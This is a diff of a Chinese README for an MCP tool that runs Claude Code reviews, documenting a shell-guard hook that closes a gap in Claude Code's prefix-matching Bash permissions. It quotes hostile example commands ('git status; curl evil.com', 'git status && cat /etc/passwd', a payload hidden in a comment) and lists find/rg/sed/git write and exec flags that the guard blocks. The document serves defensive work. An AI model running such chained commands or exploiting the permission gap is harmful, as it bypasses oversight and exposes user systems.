@@ -135,15 +135,21 @@ CLI 解析结果与来源、版本、`--effort`/`--max-budget-usd` 支持情况�
 
 Claude Code 的 Bash 权限规则是**把整条命令当字符串做前缀匹配**：`--allowedTools "Bash(git status:*)"` 不只放行 `git status`，也放行 `git status; curl evil.com`；deny glob（如 `Bash(*;*)`）根本不触发，因为规则匹配的是命令本身而非它的组成部分。**只要允许用 Bash，任何"放行第一条命令"的规则都等于放行任意命令**——这不是规则写得不够好，是权限引擎的性质，改规则列表堵不住。已实测确认。
 
-所以本 MCP 额外挂了一个 **PreToolUse hook**（`scripts/pre-tool-hook.js`，通过 `claude --settings <临时文件>` 注入，与 `--setting-sources user` 并存且不覆盖用户 settings——已实测 CC Switch 网关配置仍然生效）：命令执行前看到完整命令，命中 `;` `&&` `||` `|` `&` 换行 `>` `>>` `<` 或 `$()`/反引号/`${}` 替换即 deny。它**覆盖 subagent 的 Bash 调用**（并行评审子代理的主力），实测一次真实 review 里 2 条 `git show … | sed -n …` 被拦下并记入 `permission_denials`，评审改用分开调用后正常完成。
+所以本 MCP 额外挂了一个 **PreToolUse hook**（`scripts/pre-tool-hook.js`，通过 `claude --settings <临时文件>` 注入，与 `--setting-sources user` 并存且不覆盖用户 settings——已实测 CC Switch 网关配置仍然生效）。它**覆盖 subagent 的 Bash 调用**（并行评审子代理的主力）。
 
-它同时补上了**前缀规则本身堵不住的写/执行形态**（v1.13.1）：`find` 与 `rg` 是通过前缀规则放行的只读工具，但 `find -delete / -exec / -execdir / -ok / -okdir / -fprint / -fprintf / -fls` 会写文件或执行程序，`rg --pre / --pre-glob` 会对每个文件跑任意程序。这些形态在 hook 里被直接拒绝（allowlist 里也加了对应 deny 规则，但确定性控制是 hook），普通 `find`/`rg` 读取不受影响。
+**判定是分段的，不是"见到 `&&` 就拒"（v1.14.0）**。权限引擎只能管住"整串的第一个命令"，hook 于是逐段判定：每一段都必须是策略内的只读命令（或管道末端 sink：head/tail/cat/wc/uniq/cut/tr/grep/sort/sed -n），`cd` 只允许落到被审仓库根且必须是第一段，重定向（`>` `>>` `<`）、`$()`/反引号/`${}`、后台 `&` 一律拒绝。这样 `git show HEAD:x | sed -n '1,80p'`、`git status && git diff`、`cd <仓库根> && git show HEAD` 都能跑，而 `git status; curl evil.com`、`git status && cat /etc/passwd` 仍然被拦。
+
+为什么不是更严格的"禁止一切复合命令"：那会把模型最自然的写法（`cd <repo> && git show HEAD`）整条拒掉，每次白烧一个 turn，却并没有降低风险——同样两条命令分开调用本来就被允许。真正的安全边界是"每一段都在只读面内"，而不是"不许分段"。
+
+**hook 只能做减法（二进制实证）**：claude 2.1.311 的输出清洗器只透传 `permissionDecision: "deny" | "ask"`，`"allow"` 被显式丢弃（`permissionDecision==="deny"||==="ask"?…:void 0`），`updatedInput` 在这条路径上也没有落地。所以 hook 永远无法绕过权限引擎——这正是 allowlist 里必须有 `Bash(cd:*)` 的原因：让"形状"过引擎的闸，再由 hook 判定 `cd` 到底落在哪。任何 hook 放行、引擎拒绝的组合只会浪费一个 turn，不会削弱安全。
+
+它同时补上了**前缀规则本身堵不住的写/执行形态**：`find` 与 `rg` 是通过前缀规则放行的只读工具，但 `find -delete / -exec / -execdir / -ok / -okdir / -fprint / -fprintf / -fls` 会写文件或执行程序，`rg --pre / --pre-glob` 会对每个文件跑任意程序；同理 `sed -i`、`sed` 脚本里的 `w`/`W`/`e`、`sort -o` 都会写文件。这些形态在 hook 里按段直接拒绝（allowlist 里也加了对应 deny 规则，但确定性控制是 hook），普通读取不受影响。
 
 > ⚠️ **`--settings` 替换的是整个 `hooks` 键**：注入的临时文件里只有本 MCP 的 hook，用户 `~/.claude/settings.json` 里自己配置的 hooks 在**本次子进程内不会生效**（其它键如 `env`、`model`、`permissions` 不受影响）。这是 CLI 的行为，不是遗漏——如果你依赖自己的 hook 在 review 期间运行，目前需要另想办法。
 
-判定逻辑在 `src/shell-guard.js`，hook 与运行后的报告**共用同一份实现**，"报告说拦了"和"实际拦了"不可能不一致。它先剥掉引号 span 再判定，`git log --format="%h; %s"` 不会误报；引号不配对时 fail-closed（`git status # don't; curl evil.com` 这种把 payload 藏进注释的写法藏不住）。契约由 `scripts/shell-guard-test.mjs` 锁定（90 条，含一次真实 review 的命令回放、以及每种 `find`/`rg` 危险形态的 hook 进程实测）——**改那行正则前先跑 `npm test`**。关掉它：`CLAUDE_REVIEW_SHELL_GUARD=0`（此时整体会 fail-closed 拒跑，见下文"纵深失效即拒跑"）。
+**策略只有一份**：`src/shell-guard.js` 导出 `BASH_POLICY`，`prompt.js` 用它渲染 `Bash(...)` 权限规则，hook 用同一份表逐段判定——所以"hook 放行"与"引擎放行"不可能漂移。契约由 `scripts/shell-guard-test.mjs` 锁定（159 条：安全链必过、非法链必拦、`cd` 越界必拦、sink 写文件必拦、真实 review 的 17 条命令回放、以及每种危险形态的 hook 进程实测）——**改策略前先跑 `npm test`**。关掉它：`CLAUDE_REVIEW_SHELL_GUARD=0`（此时整体会 fail-closed 拒跑，见下文"纵深失效即拒跑"）。
 
-重定向（`>`、`<`、`2>/dev/null`）被刻意与链式命令同等拒绝：`cmd 2>/dev/null`、`sort < file` 这类日常写法会被拦下，请拆成多次调用或改用专用工具——这是防御优先于便利的设计选择，不是误报。
+重定向（含 `2>/dev/null`）仍然整体拒绝：它是绕过 allowlist 的读写原语，改成"允许读重定向"需要先证明每个目标路径都无害，代价大于收益。需要看输出就直接让命令写到 stdout。
 
 hook 还有第二条确定性规则：**git 的 `--output=` / `--output-directory=` 会让"只读"命令写文件**（`git diff/show/log --output=<file>`、`git format-patch --output-directory=` 实测都会落盘；`--output-to=` 不是真实旗标）。deny glob 对这条无能为力——Bash 规则是整条命令前缀匹配，`Bash(git diff --output=*)` 拦不住 `git diff HEAD --output=x`，而中间带 `*` 的规则语义无法从 CLI 外验证——所以这一条由 hook 直接判掉。注意 `grep --output`、`find -print` 等非 git 的 `--output` 不受影响。
 
@@ -184,7 +190,7 @@ hook 没装上、`guardSelfTest()` 自检失败（hook 真的能拦下一条链�
 
 **可观测性（v1.3.0 新增）**：结果元数据里带 `permission_denials` 与 `reviewer_subagents_spawned`。manual 模式下 allowlist 漏项不会中断运行、只会让评审静默退化（例如 reviewer 子代理根本没起来），这两个字段把这种退化变成可见的。fix 模式还会比对运行前后的 `git status`，若工作区毫无变化会明确报 `FIX MODE VERIFICATION FAILED`——评审者"描述"了修复但没落盘时不会被误判成功。
 
-v1.4.0 起元数据另加 `bashCalls`（本次发起的 Bash 调用数）与 `shellGuardBlocked`（被 hook 拦下的链式命令数），并区分两类拒绝：链式命令被拦是 **hook 正常工作**（提示模型拆成多次调用即可，不算评审退化），只有其它拒绝才报"评审可能不完整"。若出现 `⚠ SHELL-CHAINED COMMANDS RAN WITHOUT BEING BLOCKED`，说明有命令绕过了 hook 真实执行了，此时才需要把该仓库当敌对环境处理。
+v1.4.0 起元数据另加 `bashCalls`（本次发起的 Bash 调用数）与 `shellGuardBlocked`（被 hook 拦下的命令数），并区分两类拒绝：被守卫拦下是 **hook 正常工作**（提示模型改用策略内的命令即可，不算评审退化），只有其它拒绝才报"评审可能不完整"。若出现 `⚠ BASH COMMAND(S) RAN WITHOUT BEING BLOCKED`，说明有命令绕过了 hook 真实执行了，此时才需要把该仓库当敌对环境处理。
 
 v1.10.0 起返回**每个评审子代理各自的报告**（`## Reviewer subagent reports` 小节 + structuredContent 的 `subagents[]`）——此前只有父代理的综合报告，子代理内容只存在于日志文件里，这正是"同样提示词在 Claude Code 里能看到多个专家干活、通过 MCP 只有一份综述"的原因。同时新增**模型溯源**：claude 2.1+ 会把子代理事件（含它实际使用的模型）转发到父流，MCP 据此比对"请求的模型 vs 实际运行的模型"，一旦发现被改写（CC Switch 等网关、或 `~/.claude/settings.json` env 里的 `CLAUDE_CODE_SUBAGENT_MODEL` / `ANTHROPIC_DEFAULT_*_MODEL_NAME`——claude 会在 stderr 打 `[claude-code:unrecognized_model]`），就在结果里明确报 `⚠ MODEL SUBSTITUTION`：这份输出与直接在 Claude Code 里跑同一提示词**不可比**。运行前也会针对 settings.json env 里的同名改写与"进程环境的 `ANTHROPIC_BASE_URL` 被 settings 覆盖"提前预警。
 
@@ -203,7 +209,7 @@ v1.10.0 起返回**每个评审子代理各自的报告**（`## Reviewer subagen
 | `CLAUDE_REVIEW_MAX_BUDGET_USD` | `0` | 默认花费上限，`0` = 不设上限；仅改默认值，显式 `maxBudgetUsd` 优先 |
 | `CLAUDE_REVIEW_MODEL` | - | 默认模型 |
 | `CLAUDE_REVIEW_AUTO_INSTALL_SKILL` | `1` | 是否自动安装 skill |
-| `CLAUDE_REVIEW_SHELL_GUARD` | `1` | `0` 关闭 PreToolUse shell 链式命令拦截（仅用于排查误报，不推荐；单独设它不会放行，还会连带拒跑） |
+| `CLAUDE_REVIEW_SHELL_GUARD` | `1` | `0` 关闭 PreToolUse 的 Bash 分段守卫（仅用于排查误报，不推荐；单独设它不会放行，还会连带拒跑） |
 | `CLAUDE_REVIEW_ALLOW_UNGUARDED` | - | 设 `1` 才允许"hook 未生效/自检失败"时仍然开跑。默认拒跑 |
 | `CLAUDE_REVIEW_LOG_DIR` | `%TEMP%/cc-code-review` | 运行日志目录（日志含被审代码引用；Windows 上无 POSIX 权限位，可指向自有 ACL 的目录） |
 
@@ -226,10 +232,10 @@ v1.10.0 起返回**每个评审子代理各自的报告**（`## Reviewer subagen
 
 ```bash
 npm install
-npm test                                         # shell-guard 单测（90 条，免费）+ 审计修复单测（242 条，免费）+ stdio 握手/环境检查
+npm test                                         # shell-guard 单测（159 条，免费）+ 审计修复单测（242 条，免费）+ stdio 握手/环境检查
 npm run init                                     # 环境自检 + 按本机写入 ZCode 注册（免费）
 node scripts/validation-test.mjs                # 全部输入校验路径（免费，不发 API 请求）
-node scripts/cross-cases.mjs                    # 20 个 MECE 用例（108 项检查；含 ultracode/workflow + 舰队缩放、取消后保留已完成报告、误判 ack 被 notification 纠正等端到端；含桩 claude 的免费异步生命周期 + 子代理报告/模型溯源端到端；C9 付费需 CC_LOOP_PAID=1）
+node scripts/cross-cases.mjs                    # 20 个 MECE 用例（113 项检查；含 ultracode/workflow + 舰队缩放、取消后保留已完成报告、误判 ack 被 notification 纠正等端到端；含桩 claude 的免费异步生命周期 + 子代理报告/模型溯源端到端；C9 付费需 CC_LOOP_PAID=1）
 node scripts/paid-smoke.mjs [--cap=2]           # 真实 CLI 端到端 smoke：带三个已知 bug 的临时仓库，effort/reviewLevel=low，默认不设费用上限（计费，实测约 $0.5）
 node scripts/e2e-test.mjs <repoPath> [json]     # 真实 review（计费）
 node scripts/followup-e2e.mjs <repoPath> <sessionId> # 真实 followup（计费）
